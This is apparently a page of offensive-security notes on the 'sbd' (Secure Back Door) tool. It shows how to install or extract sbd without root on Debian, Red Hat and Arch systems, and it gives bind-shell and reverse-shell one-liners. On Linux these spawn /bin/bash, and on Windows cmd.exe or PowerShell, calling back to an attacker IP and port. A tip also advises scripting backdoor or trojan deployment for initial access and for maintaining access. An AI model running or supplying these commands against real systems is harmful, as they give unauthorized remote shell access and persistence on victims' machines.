---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - sbd
---
# Secure Back Door

## 01 - Setup

> [!TIP]
> You can make an automated script to deploy a trojan horse or backdoor during the initial access and maintaining access. You can check for left over packages even if it's not installed in the system.

### 1.1 - Package Manager

#### 1.1.1 - Debian-Based

Install directly in the system.

```
$ sudo apt install -y sbd
```

Another way to install the program without root permissions is by downloading the package and extract it.

```
$ apt download sbd

$ dpkg -x sbd_*.deb work
```

Then you can just execute the program as it was portable.

```
$ work/usr/bin/sbd -h
```

#### 1.1.2 - Red Hat Distros

Create a temporary folder and download the `.rpm` file.

```
$ mkdir implant && cd implant/

$ dnf download sbd
```

Extract the `.rpm` package.

```
$ rpm2cpio sbd-*.x86_64.rpm | cpio -idmv

$ tar xf sbd-*.x86_64.rpm
```

Then you can just execute the program as it was portable.

```
$ usr/bin/sbd
```

#### 1.1.3 - Arch Linux Based

You can just download the `.tar.xz` file and extract it.

```
$ wget https://mirror.archstrike.org/x86_64/archstrike/sbd-1.36-6-x86_64.pkg.tar.xz

$ tar xJf sbd-*-any.pkg.tar.xz
```

Then you can just execute the program as it was portable.

```
$ usr/bin/sbd -h
```

## 02 - Linux

### 2.1 - Bind Shell

```
$ sbd -lvnp <target_PORT> -e /bin/bash
```

### 2.2 - Reverse Shell

```
$ sbd <attacker_IP> <attacker_PORT> -e /bin/bash
```

## 03 - Windows

### 3.1 - Bind Shell

```
C:\> .\sbd.exe -lvnp <target_PORT> -e cmd.exe

C:\> .\sbd.exe -lvnp <target_PORT> -e powershell.exe
```

### 3.2 - Reverse Shell

```
C:\> .\sbd.exe <attacker_IP> <attacker_PORT> -e cmd.exe

C:\> .\sbd.exe <attacker_IP> <attacker_PORT> -e powershell.exe
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Shell Handler/Cross Platform/Manual/Netcat Variants/Secure Back Door|Shell Handler: Secure Back Door]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xE - Discover Programs/Manual/Living off the Land|Enumeration and Discovery: Discover Programs]]

- [[DEB|File Transfer and Data Exfiltration: Linux Package Manager DEB]]

- [[RPM|File Transfer and Data Exfiltration: Linux Package Manager RPM]]

- [[AUR|File Transfer and Data Exfiltration: Linux Package Manager AUR]]

- [[PFL|File Transfer and Data Exfiltration: Linux Package Manager PFL]]